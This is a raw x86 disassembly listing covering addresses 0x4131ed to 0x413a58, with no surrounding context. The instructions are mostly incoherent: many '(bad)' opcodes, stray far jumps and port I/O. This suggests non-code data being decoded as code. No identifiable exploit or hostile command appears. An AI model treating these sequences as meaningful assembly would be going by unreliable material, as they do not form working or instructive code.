  4131ed:	rcr    BYTE PTR ds:0x99f29152,1
  4131f3:	jmp    0x183b:0xcf1be316
  4131fa:	mov    al,0xd5
  4131fc:	adc    dh,ah
  4131fe:	das    
  4131ff:	add    bl,BYTE PTR [esi]
  413201:	or     bh,bh
  413203:	add    BYTE PTR [ecx+0x8b4ef4],ah
  413209:	add    BYTE PTR [eax],al
  41320b:	mov    cl,0xbd
  41320d:	test   BYTE PTR [ebx+0x579436fe],cl
  413213:	mov    dh,0xd0
  413215:	shr    ch,0xfa
  413218:	mov    esi,0x68175fd7
  41321d:	sub    bl,BYTE PTR [eax]
  41321f:	dec    edx
  413220:	lds    esp,FWORD PTR [edi-0x516a3b07]
  413226:	add    esi,DWORD PTR [edi-0x3c]
  413229:	pop    DWORD PTR [edx]
  41322b:	in     eax,0xeb
  41322d:	add    eax,0x9edb0000
	...
  41323e:	xor    bh,BYTE PTR ds:0xfb
  413244:	add    BYTE PTR [eax],al
  413246:	add    BYTE PTR [eax],al
  413248:	add    BYTE PTR [eax],al
  41324a:	(bad)  
  41324b:	jmp    DWORD PTR [ebx+0x7c]
  41324e:	in     eax,0xf4
  413250:	pop    edx
  413251:	add    bl,al
  413253:	ret    0xb037
  413256:	ret    0x1716
  413259:	xor    ebp,edi
  41325b:	add    esp,edx
  41325d:	fidivr WORD PTR [ecx+0x65d871]
  413263:	xchg   esp,eax
  413264:	(bad)  
  413265:	dec    ebp
  413267:	jmp    0x4132b2
  413269:	rcr    BYTE PTR [eax+0x74e37c67],cl
  41326f:	sbb    esi,esi
  413271:	xor    BYTE PTR [ebp-0x5a5b6c9b],dl
  413277:	call   0x27cf:0xcc13ab9
  41327e:	push   es
  41327f:	dec    ecx
  413280:	clc    
  413281:	xchg   edi,eax
  413282:	mov    edi,?
  413284:	dec    DWORD PTR [eax-0x32]
  413287:	hlt    
  413288:	(bad)  
  413289:	jmp    FWORD PTR [edi-0x6b]
  41328c:	outs   dx,BYTE PTR ds:[esi]
  41328d:	inc    DWORD PTR [eax]
  41328f:	retf   
  413290:	ret    
  413291:	dec    edi
  413292:	(bad)  
  413293:	push   edx
  413294:	cdq    
  413295:	xor    al,0xcd
  413297:	xchg   esi,eax
  413298:	jno    0x413221
  41329a:	jecxz  0x4132ac
  41329c:	mov    ecx,0xb421caf4
  4132a1:	test   BYTE PTR [edx+0x4fac6d8e],0x0
  4132a8:	add    BYTE PTR [eax],al
  4132aa:	xchg   ecx,eax
  4132ab:	add    DWORD PTR [eax],0x498600
	...
  4132b9:	add    BYTE PTR [eax],al
  4132bb:	add    bl,ah
  4132bd:	sub    dh,BYTE PTR [ebp+0x34]
  4132c0:	adc    eax,0x7602db5c
  4132c5:	or     ebp,DWORD PTR [ecx-0x731969ed]
  4132cb:	sub    BYTE PTR [edx+0x10],dh
  4132ce:	std    
  4132cf:	and    DWORD PTR [edx+0x1491ca],0x0
  4132d9:	add    BYTE PTR [eax],al
  4132db:	add    BYTE PTR [eax],al
  4132dd:	(bad)  
  4132de:	call   DWORD PTR [eax-0x6e]
  4132e1:	inc    ebx
  4132e2:	cdq    
  4132e3:	(bad)  
  4132e4:	jmp    DWORD PTR [ecx]
  4132e6:	mov    eax,ds:0x5ef0a731
  4132eb:	ret    
  4132ec:	in     eax,dx
  4132ed:	lahf   
  4132ee:	dec    esp
  4132ef:	stos   BYTE PTR es:[edi],al
  4132f0:	mov    esi,0xa2135688
  4132f5:	add    esp,DWORD PTR [eax+0x41e00db8]
  4132fb:	mov    ah,bl
  4132fd:	add    DWORD PTR [eax],ebx
  4132ff:	push   esp
  413300:	in     eax,dx
  413301:	test   al,0xdc
  413303:	cmp    dl,BYTE PTR [edx-0x2b]
  413306:	in     al,0xd
  413308:	(bad)  
  413309:	push   DWORD PTR ds:0xbcfffff8
  41330f:	mov    DWORD PTR [ebx],0x2f6604ff
  413315:	das    
  413316:	scas   al,BYTE PTR es:[edi]
  413317:	push   es
  413318:	add    eax,ebp
  41331a:	xor    DWORD PTR [edx+0x2d8f7184],0x3d
  413321:	shl    BYTE PTR [ebp-0x3c6a4f8c],1
  413327:	retf   0xc29f
  41332a:	jns    0x413330
  41332c:	add    al,0x4
  41332e:	pop    ebp
  41332f:	dec    ebx
  413330:	psubusb mm5,mm1
  413333:	jnp    0x413382
  413335:	inc    edx
  413336:	fsubr  DWORD PTR [ebx+0x26]
  413339:	sub    al,0x88
  41333b:	jmp    0x413365
  41333d:	xor    bh,BYTE PTR [eax-0x2889fbb8]
  413343:	push   ds
  413344:	test   dh,dh
  413346:	mov    edi,0xc58d4225
  41334b:	add    al,0x4
  41334d:	imul   DWORD PTR [esi+0x4040402]
  413353:	or     BYTE PTR [eax],cl
  413355:	or     BYTE PTR [eax],cl
  413357:	or     BYTE PTR [eax],cl
  413359:	or     BYTE PTR [eax],cl
  41335b:	or     BYTE PTR [edi-0x727290d7],dl
  413361:	lea    ecx,[ebp-0x72727273]
  413367:	(bad)  
  413368:	call   0x9a3dd455
  41336d:	push   eax
  41336e:	in     eax,0xdc
  413370:	cmp    ebp,DWORD PTR [ebp-0x67190e53]
  413376:	retf   0xe09d
  413379:	nop
  41337a:	or     ecx,ebp
  41337c:	scas   al,BYTE PTR es:[edi]
  41337d:	mov    dl,BYTE PTR [ecx+ebp*8+0xa]
  413381:	shr    eax,0xe8
  413384:	or     edx,ecx
  413386:	call   0xe88fa573
  41338b:	call   0x3b1b4270
  413390:	mov    bl,0x69
  413392:	or     BYTE PTR [edi+0x6d4fb816],ah
  413398:	sub    DWORD PTR [edx-0xe],esi
  41339b:	daa    
  41339c:	dec    ecx
  41339d:	mov    cl,0xe1
  41339f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4133a0:	imul   esi,DWORD PTR [eax-0x7c17c3a1],0x54
  4133a7:	in     eax,0xae
  4133a9:	mov    ds:0x97838383,eax
  4133ae:	mov    gs,eax
  4133b0:	adc    cl,BYTE PTR [esi-0x69f27ac1]
  4133b6:	jl     0x4133dc
  4133b8:	les    esi,FWORD PTR [edi]
  4133ba:	in     eax,dx
  4133bb:	xor    DWORD PTR [ebp+ebp*1+0x23],ebp
  4133bf:	jo     0x413413
  4133c1:	retf   
  4133c2:	mov    esp,0x77e34b80
  4133c7:	mov    edx,0x3292a15f
  4133cc:	stc    
  4133cd:	sbb    ebx,DWORD PTR [ecx-0x797c7cd0]
  4133d3:	inc    BYTE PTR [ebx+0x75758383]
  4133d9:	jne    0x413450
  4133db:	jne    0x413452
  4133dd:	jne    0x413454
  4133df:	jne    0x41345e
  4133e1:	mov    ebx,edi
  4133e3:	add    DWORD PTR [ebx-0x7c7c7c7d],0xffffff83
  4133ea:	add    DWORD PTR [ebx-0x41df7475],0x17
  4133f1:	push   0xffffffac
  4133f3:	adc    al,0xaa
  4133f5:	sub    ch,ch
  4133f7:	iret   
  4133f8:	nop
  4133f9:	jae    0x413391
  4133fb:	dec    edx
  4133fc:	mov    ecx,0x5955122f
  413401:	and    eax,edi
  413403:	push   es
  413404:	and    BYTE PTR [edx+0x43],ah
  413407:	gs dec esi
  413409:	outs   dx,BYTE PTR ds:[esi]
  41340a:	jbe    0x413479
  41340c:	cmp    al,0x6d
  41340e:	gs jo  0x413431
  413411:	cs fs push ebx
  413414:	jo     0x413485
  413416:	bound  esi,QWORD PTR [bx+0x72]
  41341a:	inc    esp
  41341b:	bound  ebp,QWORD PTR cs:[esi]
  41341e:	gs dec ebp
  413420:	or     eax,0x6e2e7472
  413425:	cmp    al,0x63
  413427:	jb     0x413467
  413429:	ins    DWORD PTR es:[edi],dx
  41342a:	and    BYTE PTR ds:[edx],cl
  41342d:	or     dh,BYTE PTR [edx+0x6f]
  413430:	jo     0x4134a4
  413432:	jb     0x4134a7
  413434:	gs gs dec ebp
  413437:	arpl   WORD PTR [edx],cx
  413439:	ins    DWORD PTR es:[edi],dx
  41343a:	gs popa 
  41343c:	outs   dx,BYTE PTR ds:[esi]
  41343d:	jb     0x4134b3
  41343f:	jb     0x41341d
  413441:	sbb    ecx,DWORD PTR [ebx-0x14a93a75]
  413447:	and    al,0xc4
  413449:	les    eax,FWORD PTR [ebx]
  41344b:	or     bl,bh
  41344d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41344e:	xor    DWORD PTR [edx],esi
  413450:	jnp    0x4133fe
  413452:	fisub  WORD PTR [eax+eiz*8+0x23]
  413456:	adc    DWORD PTR [edi],eax
  413458:	adc    al,BYTE PTR [ebx]
  41345a:	pushf  
  41345b:	xchg   ecx,eax
  41345c:	inc    eax
  41345d:	dec    ecx
  41345e:	cwde   
  41345f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413460:	fimul  DWORD PTR [ebx+0x354e28b]
  413466:	mov    ecx,DWORD PTR [ebx-0x74a8c20b]
  41346c:	mov    edi,edi
  41346e:	(bad)  
  41346f:	cwde   
  413470:	cwde   
  413471:	mov    ebp,0x849ecf
  413476:	daa    
  413477:	mov    esp,0x8583850f
  41347c:	rol    DWORD PTR [eax-0x256762c3],1
  413482:	daa    
  413483:	dec    edi
  413484:	mov    edx,0x888b8b8b
  413489:	mov    cl,BYTE PTR [ebx-0x74581475]
  41348f:	mov    ecx,DWORD PTR [ebx+0x8080808]
  413495:	or     BYTE PTR [eax],cl
  413497:	or     BYTE PTR [eax],cl
  413499:	or     BYTE PTR [edi-0x6d],bh
  41349c:	daa    
  41349d:	loope  0x413493
  41349f:	add    ecx,0x7cb74b28
  4134a5:	xlat   BYTE PTR ds:[ebx]
  4134a6:	int    0x66
  4134a8:	dec    eax
  4134a9:	int    0x6d
  4134ab:	clc    
  4134ac:	shr    BYTE PTR [eax+0x35d5958],0x0
	...
  4134bb:	add    DWORD PTR [ebx+0x24669515],0xffffff83
  4134c2:	add    edx,0xffffffb2
  4134c5:	cdq    
  4134c6:	(bad)  
  4134c7:	cmp    al,0x42
  4134c9:	ss mov al,al
  4134cc:	shl    BYTE PTR [edx+0x3014dd0d],cl
  4134d2:	mov    bh,bh
  4134d4:	adc    BYTE PTR [ebx-0x16],bl
  4134d7:	clc    
  4134d8:	ror    edi,cl
  4134da:	dec    edi
  4134db:	das    
  4134dc:	call   DWORD PTR [edx-0x5e]
  4134df:	icebp  
  4134e0:	or     eax,0x77f888f3
  4134e5:	adc    al,0x83
  4134e7:	cmp    DWORD PTR [esi-0x2c7c7ccd],0xffffff94
  4134ee:	fiadd  WORD PTR [ebx+0x73673000]
  4134f4:	push   ds
  4134f5:	sti    
  4134f6:	in     eax,dx
  4134f7:	jg     0x413568
  4134f9:	jbe    0x41348e
  4134fb:	(bad)  
  4134fd:	fs push esp
  4134ff:	mov    edx,0xc5575c7b
  413504:	and    eax,0x6e39c88d
  413509:	add    BYTE PTR [eax],al
  41350b:	add    ch,ah
  41350d:	push   esi
  41350e:	mov    eax,ds:0xc4c915c7
  413513:	std    
  413514:	adc    esp,eax
  413516:	shr    eax,cl
  413518:	std    
  413519:	out    dx,al
  41351a:	in     eax,dx
  41351b:	pushfw 
  41351d:	sbb    bl,BYTE PTR [eax-0x4]
  413520:	pop    ebx
  413521:	cmp    dh,BYTE PTR [ecx]
  413523:	or     ebx,ecx
  413525:	push   edx
  413526:	(bad)  
  413527:	in     al,dx
  413528:	sbb    DWORD PTR [eax],eax
  41352a:	add    BYTE PTR [ebx-0x66],bh
  41352d:	mov    ds:0xff000000,al
  413532:	(bad)  
  413533:	(bad)  
  413534:	(bad)  
  413535:	(bad)  
  413536:	(bad)  
  413537:	(bad)  
  413538:	(bad)  
  413539:	dec    eax
  41353b:	xor    BYTE PTR [eax],al
	...
  413545:	add    BYTE PTR [eax],al
  413547:	add    BYTE PTR [esi],bl
  413549:	sub    dl,dh
  41354b:	in     al,0x9
  41354d:	sub    DWORD PTR [esi-0x102f10e],ecx
  413553:	dec    ebx
  413554:	push   ecx
  413555:	mov    ds:0x2c169391,eax
  41355a:	sbb    al,0x84
  41355c:	mov    esi,cs
  41355e:	adc    BYTE PTR [edx+0x0],0x0
  413562:	clc    
  413563:	dec    edx
  413564:	add    BYTE PTR [eax],al
  413566:	hlt    
  413567:	rol    DWORD PTR [eax],0x0
  41356a:	popa   
  41356b:	mov    edi,0x711ad41f
  413570:	out    0xa2,al
  413572:	loope  0x413546
  413574:	(bad)  
  413575:	lods   al,BYTE PTR ds:[esi]
  413576:	retf   
  413577:	mov    DWORD PTR [eax-0x35ce7b04],eax
  41357d:	jno    0x413561
  41357f:	mov    dl,0xd7
  413581:	jl     0x413583
  413583:	(bad)  
  413584:	fidiv  WORD PTR ds:0xffff45f5
  41358a:	call   FWORD PTR [eax]
  41358c:	or     BYTE PTR [ebx+0x525dd982],cl
  413592:	add    esp,DWORD PTR [esi+0x66]
  413595:	mov    ebp,0xad5cd837
  41359a:	add    ebx,DWORD PTR [edi+0x2a]
  41359d:	add    DWORD PTR [ebx],eax
  41359f:	pop    DWORD PTR [ebp-0x4c]
  4135a2:	and    DWORD PTR [ecx+0x3ff5a58f],edi
  4135a8:	pop    edx
  4135a9:	pop    edi
  4135aa:	ror    BYTE PTR [edx-0xec8],0x1e
  4135b1:	jle    0x4135b2
  4135b3:	(bad)  
  4135b4:	dec    DWORD PTR [ebp-0x72727273]
  4135ba:	lea    ecx,[ebp+0x20d98d8d]
  4135c0:	das    
  4135c1:	je     0x413637
  4135c3:	je     0x413639
  4135c5:	je     0x41363b
  4135c7:	je     0x41363d
  4135c9:	je     0x413556
  4135cb:	mov    esp,DWORD PTR [esi-0xf]
  4135ce:	retf   
  4135cf:	addr16 loope 0x4135a8
  4135d2:	popa   
  4135d3:	xchg   edx,eax
  4135d4:	ret    
  4135d5:	inc    ebx
  4135d6:	push   ecx
  4135d7:	push   es
  4135d8:	push   ss
  4135d9:	xor    DWORD PTR [edx-0x5c],0x6df24c9c
  4135e0:	pop    ebp
  4135e1:	pop    es
  4135e2:	inc    ebp
  4135e3:	aam    0x8b
  4135e5:	mov    esp,DWORD PTR [ebp+0x5f3ecb86]
  4135eb:	and    DWORD PTR [edi+0x1e884a9b],edi
  4135f1:	cwde   
  4135f2:	xchg   ebp,eax
  4135f3:	idiv   DWORD PTR [ecx+0x70]
  4135f6:	gs gs jo 0x413667
  4135fa:	imul   esp,DWORD PTR [ecx+ebp*2+0x70],0x6574416d
  413602:	push   ebx
  413603:	and    BYTE PTR [edi+edx*2+0x70],dh
  413607:	cmp    al,0x63
  413609:	jb     0x41367e
  41360b:	bound  esp,QWORD PTR [eax]
  41360d:	and    ah,BYTE PTR [ebp+0x22]
  413610:	imul   esp,DWORD PTR [ecx+0x62],0x6d72222e
  413617:	cmp    al,0x62
  413619:	and    ah,BYTE PTR fs:[ebp+0x6e]
  41361d:	push   edx
  41361e:	arpl   WORD PTR [bp+di+0x2e],sp
  413622:	ins    DWORD PTR es:[edi],dx
  413623:	or     ch,BYTE PTR [eax]
  413625:	push   ebx
  413626:	gs jae 0x41368c
  413629:	cs inc ecx
  41362b:	and    BYTE PTR [esp+esi*2+0x4d],ch
  41362f:	or     eax,0xd6d7362
  413634:	gs arpl WORD PTR cs:[eax+0x74],bp
  413639:	jb     0x41369f
  41363b:	or     dh,BYTE PTR [edx+0xd]
  41363e:	or     al,BYTE PTR [ecx+0xa]
  413641:	cmp    al,0x6c
  413643:	ins    DWORD PTR es:[edi],dx
  413644:	ins    DWORD PTR es:[edi],dx
  413645:	and    BYTE PTR [edx+0x65],dh
  413648:	imul   ebp,DWORD PTR [eax+ebp*2],0x2e220a41
  41364f:	outs   dx,DWORD PTR gs:[esi]
  413651:	and    ch,BYTE PTR [edi+0x20]
  413654:	ins    DWORD PTR es:[edi],dx
  413655:	ins    DWORD PTR es:[edi],dx
  413656:	gs jb  0x4136cd
  413659:	arpl   WORD PTR [esi-0x69],si
  41365c:	lods   eax,DWORD PTR ds:[esi]
  41365d:	inc    ebx
  41365e:	mov    esp,0x3f4f796
  413663:	ror    BYTE PTR [ecx+ecx*1],0x6f
  413667:	inc    esi
  413668:	mov    ecx,DWORD PTR gs:[ebx-0x74c81045]
  41366f:	mov    ebx,edi
  413671:	mov    edx,0x48008bdc
  413676:	inc    edi
  413677:	in     eax,dx
  413678:	(bad)  
  413679:	ins    BYTE PTR es:[edi],dx
  41367a:	call   0xf6c9:0x7c183fba
  413681:	hlt    
  413682:	mov    bl,0x27
  413684:	mov    esi,0xb1ce2816
  413689:	or     BYTE PTR [ebx],bl
  41368b:	inc    ebp
  41368c:	xor    BYTE PTR [eax],al
  41368e:	add    BYTE PTR [eax],al
  413690:	imul   ecx,eax,0xba3b0000
  413696:	add    BYTE PTR [eax],al
  413698:	add    BYTE PTR [esp],ah
  41369b:	and    al,0x24
  41369d:	and    al,0x24
  41369f:	and    al,0x24
  4136a1:	and    al,0xd9
  4136a3:	ins    BYTE PTR es:[edi],dx
  4136a4:	mov    ebp,0x624c9448
  4136a9:	mov    esi,0xd379e4e1
  4136ae:	ja     0x4136f7
  4136b0:	sub    BYTE PTR [ecx],0x6f
  4136b3:	adc    DWORD PTR [ebp+edi*4+0x4183aaba],ecx
  4136ba:	(bad)  
  4136bb:	(bad)  
  4136bc:	(bad)  
  4136bd:	(bad)  
  4136be:	(bad)  
  4136bf:	(bad)  
  4136c0:	(bad)  
  4136c1:	(bad)  
  4136c2:	inc    DWORD PTR [eax]
  4136c4:	add    BYTE PTR [eax+0x2f5cd8],al
  4136ca:	add    BYTE PTR [esi+0x5cfeac6],dl
  4136d0:	or     esp,ecx
  4136d2:	mov    ah,0x99
  4136d4:	pmullw mm0,QWORD PTR [edi-0x64]
  4136d8:	push   es
  4136d9:	and    al,0xc3
  4136db:	leave  
  4136dc:	xor    dh,dh
  4136de:	aaa    
  4136df:	adc    ah,bl
  4136e1:	cmp    eax,0x575633d4
  4136e6:	adc    eax,DWORD PTR [ebx+0x7e2114b6]
  4136ec:	aas    
  4136ed:	lods   al,BYTE PTR ds:[esi]
  4136ee:	add    BYTE PTR [eax],al
  4136f0:	retf   0x22
  4136f3:	add    BYTE PTR [edi+0xaf76],cl
  4136f9:	imul   DWORD PTR [eax]
  4136fb:	sub    BYTE PTR [esi+0x25],cl
  4136fe:	xor    DWORD PTR [edi+0x7fe3551b],esp
  413704:	mov    dh,BYTE PTR [ebp+0x22]
  413707:	mov    bl,0xde
  413709:	je     0x41373b
  41370b:	pushf  
  41370c:	cwde   
  41370d:	mov    dh,0x43
  41370f:	mov    bh,0xf4
  413711:	add    BYTE PTR [eax],al
  413713:	add    BYTE PTR [edi-0x69a5894b],bl
  413719:	and    eax,0x5ac85a3e
  41371e:	fucomip st,st(1)
  413720:	push   edi
  413721:	loopne 0x413775
  413723:	inc    eax
  413724:	sti    
  413725:	je     0x413718
  413727:	cmc    
  413728:	ins    BYTE PTR es:[edi],dx
  413729:	mov    esi,0xb21b41ae
  41372e:	clc    
  41372f:	xchg   edx,eax
  413730:	icebp  
  413731:	add    BYTE PTR [eax],al
  413733:	repnz scas eax,DWORD PTR es:[edi]
  413735:	cmp    DWORD PTR [eax],eax
	...
  41373f:	add    BYTE PTR [eax],al
  413741:	add    ch,bl
  413743:	loope  0x41374f
  413745:	(bad)  
  413746:	(bad)  
  413747:	(bad)  
  413748:	(bad)  
  413749:	(bad)  
  41374a:	(bad)  
  41374b:	(bad)  
  41374c:	(bad)  
  41374d:	inc    DWORD PTR [eax]
  41374f:	add    cl,dl
  413751:	fbld   TBYTE PTR [ecx+0x25]
  413754:	sbb    DWORD PTR [ecx+0x5b64addf],edi
  41375a:	lea    esi,[eax+eiz*1-0x6fcf5621]
  413761:	xor    edx,esp
  413763:	dec    edx
  413764:	push   eax
  413765:	adc    bl,BYTE PTR [esi+0x150000da]
  41376b:	add    eax,0xe0fc0000
  413770:	add    BYTE PTR [eax],al
  413772:	test   DWORD PTR [esi+0x77],esp
  413775:	jle    0x4136fc
  413777:	jge    0x413772
  413779:	sbb    DWORD PTR [edx+eiz*8+0x10a06ce9],ebp
  413780:	push   edi
  413781:	or     DWORD PTR [eax-0x26a1d8a8],ebx
  413787:	scas   al,BYTE PTR es:[edi]
  413788:	mov    ecx,0x938d0067
  41378d:	and    al,0x9a
  41378f:	pop    ebx
  413790:	lea    ecx,[ebp-0xb416f73]
  413796:	and    BYTE PTR [esi-0x764e29d7],al
  41379c:	push   es
  41379d:	xor    eax,esi
  41379f:	xchg   ebx,eax
  4137a0:	cli    
  4137a1:	mov    dh,BYTE PTR [ebp+0x76]
  4137a4:	push   0x58
  4137a6:	call   0x283c:0x68301b0f
  4137ad:	or     DWORD PTR [eax+0x1b2f9ca6],ebp
  4137b3:	mov    esp,0x8d8da70c
  4137b8:	mov    ch,0x65
  4137ba:	lea    ecx,[ebp-0x7c7c7c73]
  4137c0:	add    DWORD PTR [ebx-0x7c7c7c7d],0x3f
  4137c7:	and    BYTE PTR [bx+si],al
	...
  4137d2:	add    BYTE PTR [eax],al
  4137d4:	in     eax,0xcf
  4137d6:	cmp    DWORD PTR [ebp-0x470466cb],0x62
  4137dd:	scas   eax,DWORD PTR es:[edi]
  4137de:	push   eax
  4137df:	bound  ecx,QWORD PTR [ebx-0x46]
  4137e2:	jb     0x413844
  4137e4:	int    0x6e
  4137e6:	ret    0x8a26
  4137e9:	cld    
  4137ea:	inc    edx
  4137eb:	pop    ebx
  4137ec:	add    BYTE PTR [eax],al
  4137ee:	adc    eax,0xbffbaca3
  4137f3:	push   edi
  4137f4:	or     dl,BYTE PTR [edi]
  4137f6:	pop    esi
  4137f7:	jne    0x4137d1
  4137f9:	(bad)  [ecx-0x47b6fe33]
  4137ff:	adc    eax,DWORD PTR [ebp+0x26]
  413802:	and    DWORD PTR [ebx],edx
  413804:	xchg   BYTE PTR [edi-0x2c1d410d],dh
  41380a:	repnz add BYTE PTR [eax],al
  41380d:	push   ds
  41380e:	jmp    0xfa34:0x1e0000f1
  413815:	add    BYTE PTR [esi+ebp*4],al
  413818:	mov    eax,ds:0xbf503fcc
  41381d:	(bad)  
  41381e:	(bad)  
  41381f:	push   0xa57b47ce
  413824:	cld    
  413825:	std    
  413826:	lock test BYTE PTR [ebp+0x6f],dh
  41382a:	jmp    0x404:0x6ab5af5a
  413831:	add    al,0xb9
  413833:	xchg   DWORD PTR [esp+eax*1],eax
  413836:	sub    eax,0x40404b0
  41383b:	jne    0x4138b2
  41383d:	jne    0x4138b4
  41383f:	jne    0x4138b6
  413841:	jne    0x4138b8
  413843:	jne    0x413815
  413845:	sbb    BYTE PTR [ebp-0x797ff0a5],ch
  41384b:	jg     0x413817
  41384d:	and    edi,edi
  41384f:	jmp    0x9bc2f9c3
  413854:	pusha  
  413855:	outs   dx,DWORD PTR ds:[esi]
  413856:	jno    0x413853
  413858:	gs repnz xor al,0xe5
	...
  413864:	add    BYTE PTR [eax],al
  413866:	add    BYTE PTR [esi],cl
  413868:	add    DWORD PTR [eax-0x32ffffed],eax
  41386e:	js     0x413810
  413870:	ins    BYTE PTR es:[edi],dx
  413871:	pop    ss
  413872:	inc    BYTE PTR [edi-0x18]
  413875:	dec    eax
  413876:	ror    BYTE PTR [esi],1
  413878:	(bad)  
  413879:	lock pop ebx
  41387b:	push   es
  41387c:	ja     0x413876
  41387e:	ror    BYTE PTR [eax+0x34],0x9b
  413882:	pop    ebx
  413883:	push   edi
  413884:	pop    ds
  413885:	cmp    eax,0x7234bdf8
  41388a:	loopne 0x41382d
  41388c:	mov    ecx,0xb75b13
  413891:	add    BYTE PTR [ecx-0x4f],cl
  413894:	add    BYTE PTR [eax],al
  413896:	enter  0x2112,0x0
  41389a:	cmp    DWORD PTR [eax],0x17
  41389d:	lea    edi,[esi*2+0x464cc165]
  4138a4:	ins    DWORD PTR es:[edi],dx
  4138a5:	mov    dl,0x5e
  4138a7:	ds adc al,0xf2
  4138aa:	sbb    ch,BYTE PTR [ebp-0x50bb4797]
  4138b0:	mov    esp,0x83838877
  4138b5:	cmp    DWORD PTR [esi],0x5c
  4138b8:	adc    al,al
  4138ba:	jmp    0x94af3e03
  4138bf:	ror    cl,0x17
  4138c2:	fisubr DWORD PTR [edx-0x57]
  4138c5:	add    DWORD PTR [ecx-0x52f20881],eax
  4138cb:	adc    edi,eax
  4138cd:	int    0x91
  4138cf:	cmp    ebp,DWORD PTR [edi]
  4138d1:	lahf   
  4138d2:	sbb    eax,0x2c58383
  4138d7:	or     eax,DWORD PTR [ebx+0x8088383]
  4138dd:	or     BYTE PTR [eax],cl
  4138df:	or     BYTE PTR [eax],cl
  4138e1:	or     BYTE PTR [eax],cl
  4138e3:	or     BYTE PTR [esi+0x67],bh
  4138e6:	retf   
	...
  4138ef:	add    al,ch
  4138f1:	call   0xfcbf4eba
  4138f6:	(bad)  
  4138f7:	and    al,cl
  4138f9:	in     eax,0xf4
  4138fb:	ja     0x413907
  4138fd:	fucomi st,st(2)
  4138ff:	jmp    0x4138f5
  413901:	daa    
  413902:	ret    
  413903:	sub    al,0x71
  413905:	push   eax
  413906:	mov    bl,0x52
  413908:	inc    esp
  413909:	or     eax,ebp
  41390b:	call   0xe929ff87
  413910:	add    BYTE PTR [ecx],ch
  413912:	call   0x9209d4ff
  413917:	out    0xd4,al
  413919:	in     al,dx
  41391a:	and    eax,0xb500575
  41391f:	clc    
  413920:	add    BYTE PTR [edi+0x7d7d2656],dh
  413926:	sbb    DWORD PTR [ebx+ecx*1+0x33],edi
  41392a:	pop    edi
  41392b:	retf   0x8be8
  41392e:	mov    esi,0x8b3a822e
  413933:	mov    ecx,DWORD PTR [ebx+0x66c26107]
  413939:	fcomp  QWORD PTR [esp+edi*4-0x23a3b4d0]
  413940:	in     eax,dx
  413941:	ss mov eax,0x64078564
  413947:	inc    eax
  413948:	js     0x41399e
  41394a:	sti    
  41394b:	in     eax,dx
  41394c:	xchg   edi,eax
  41394d:	pop    ds
  41394e:	aad    0x87
  413950:	ja     0x41394d
  413952:	je     0x413998
  413954:	push   ebx
  413955:	push   0x622e6565
  41395a:	ins    DWORD PTR es:[edi],dx
  41395b:	ins    DWORD PTR es:[edi],dx
  41395c:	cmp    dh,BYTE PTR [eax+0x6d]
  41395f:	and    BYTE PTR [eax+0x61],bh
  413962:	or     eax,0x73742f63
  413967:	and    BYTE PTR [ebx+esi*2+0x53],al
  41396b:	outs   dx,DWORD PTR ds:[esi]
  41396c:	and    BYTE PTR [eax],ah
  41396e:	and    BYTE PTR [ebp+0x65],ch
  413971:	and    BYTE PTR cs:[ebp+0x3d],ch
  413975:	inc    esp
  413976:	ins    DWORD PTR es:[edi],dx
  413977:	and    BYTE PTR [ebp+0x53],dh
  41397a:	dec    ebp
  41397b:	and    esp,DWORD PTR [ebx+0x20]
  41397e:	jb     0x4139e3
  413980:	outs   dx,BYTE PTR ds:[esi]
  413981:	jns    0x4139a3
  413983:	push   0x20576c3a
  413988:	jo     0x4139aa
  41398a:	outs   dx,DWORD PTR ds:[esi]
  41398b:	popa   
  41398c:	push   0x6c6f2253
  413991:	ins    DWORD PTR es:[edi],dx
  413992:	and    ah,BYTE PTR [ebx]
  413994:	je     0x4139f8
  413996:	je     0x413a0e
  413998:	outs   dx,DWORD PTR ds:[esi]
  413999:	inc    ecx
  41399a:	ja     0x4139f1
  41399c:	push   ebx
  41399d:	or     ch,BYTE PTR [ecx+0x63]
  4139a0:	arpl   WORD PTR [esi+0x20],sp
  4139a3:	das    
  4139a4:	jae    0x413a08
  4139a6:	jb     0x4139d4
  4139a8:	and    BYTE PTR [eax+0x20],bh
  4139ab:	jae    0x413958
  4139ad:	aaa    
  4139ae:	inc    edi
  4139af:	push   ecx
  4139b0:	pop    eax
  4139b1:	les    ecx,FWORD PTR [ebx-0x74344975]
  4139b7:	mov    ecx,DWORD PTR [ebx-0x1]
  4139bd:	(bad)  
  4139be:	(bad)  
  4139bf:	(bad)  
  4139c0:	(bad)  
  4139c1:	call   DWORD PTR [eax]
  4139c3:	inc    esi
  4139c4:	pusha  
	...
  4139cd:	add    BYTE PTR [eax],al
  4139cf:	add    BYTE PTR [edx+0x43],al
  4139d2:	cmp    ch,BYTE PTR [ebp+0x6f7a6be6]
  4139d8:	jo     0x413a08
  4139da:	and    DWORD PTR [esi+0x7e7522e],ecx
  4139e0:	sub    BYTE PTR [ecx+0x3f958f],cl
  4139e6:	jbe    0x4139c6
  4139e8:	add    BYTE PTR [eax],al
  4139ea:	xor    eax,0xa2ff8908
  4139ef:	sub    DWORD PTR [ebx-0x6e],ecx
  4139f2:	fsubr  QWORD PTR [eax-0x21]
  4139f5:	mov    ds:0x77689f8f,eax
  4139fa:	sub    dh,BYTE PTR [bp+di+0x2b]
  4139fe:	cmp    cl,BYTE PTR [ebx+0x7443063]
  413a04:	idiv   DWORD PTR ds:0x600003c
  413a0a:	je     0x413a12
  413a0c:	add    BYTE PTR [eax],al
  413a0e:	xor    eax,0x66dc
  413a13:	test   al,0xe7
  413a15:	mov    dl,0x48
  413a17:	leave  
  413a18:	fucomip st,st(5)
  413a1a:	mov    edx,0x236b41d5
  413a1f:	and    ch,BYTE PTR [ebx]
  413a21:	push   ds
  413a22:	inc    ecx
  413a23:	call   0x1277c7f1
  413a28:	daa    
  413a29:	sbb    eax,0xc7
  413a2e:	adc    esi,DWORD PTR [esi+0x55560000]
  413a34:	add    BYTE PTR [eax],al
  413a36:	add    al,ch
  413a38:	call   0xe92a2325
  413a3d:	call   0xeea7232a
  413a42:	aad    0xc4
  413a44:	dec    edi
  413a45:	cmc    
  413a46:	mov    cl,0x72
  413a48:	add    BYTE PTR [esp+edi*8+0x56],cl
  413a4c:	add    BYTE PTR [ebx],ah
  413a4e:	(bad)  
  413a4f:	icebp  
  413a50:	or     eax,0xbb19fafb
  413a55:	das    
  413a56:	in     al,0x1e
  413a58:	lea    ecx,[ebp-0x72727273]
